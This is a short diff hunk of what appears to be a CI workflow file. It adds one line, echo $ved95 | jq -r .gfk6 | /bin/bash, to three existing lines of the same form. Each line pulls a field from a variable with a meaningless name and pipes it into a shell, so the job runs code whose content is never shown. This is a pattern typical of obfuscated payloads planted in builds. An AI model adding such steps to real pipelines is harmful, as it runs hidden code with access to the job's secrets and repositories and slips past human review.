@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$kuosy713" | jq -r .fvtps4 | /bin/bash
           echo $qudlh27 | jq -r .ipr75 | /bin/bash
           printf '%s' "$a113" | jq -r .cbi34962 | /bin/bash
+          echo $ved95 | jq -r .gfk6 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
